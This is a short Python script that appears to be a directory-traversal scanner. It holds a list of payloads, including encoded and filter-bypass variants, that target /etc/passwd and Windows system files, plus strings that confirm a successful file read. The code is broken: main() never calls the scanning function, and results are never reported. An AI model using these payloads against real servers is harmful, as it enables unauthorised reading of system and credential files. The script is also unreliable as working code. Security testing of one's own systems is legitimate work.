import urllib.request
import urllib.parse
import sys

def test_directory_traversal(base_url):
    # Common directory traversal payloads
    payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc//passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
        "../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\windows\\win.ini"
    ]
    
    # Evidence patterns that indicate successful directory traversal
    evidence_patterns = [
        "root:",
        "[boot loader]",
        "# Copyright",
        "localhost",
        "daemon:",
        "bin:",
        "[fonts]"
    ]
    
    for payload in payloads:
        try:
            # Replace {PATH} with the payload
            test_url = base_url.replace("{PATH}", payload)
            
            # Make the request
            req = urllib.request.Request(test_url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                content = response.read().decode('utf-8', errors='ignore')
                
                # Check for evidence of successful directory traversal
                found_evidence = None
                for pattern in evidence_patterns:
                    if pattern in content:
                        found_evidence = pattern
                        break
                
        except Exception as e:
            pass

def main():
    base_url = input().strip()
    print("Testing")

if __name__ == "__main__":
    main()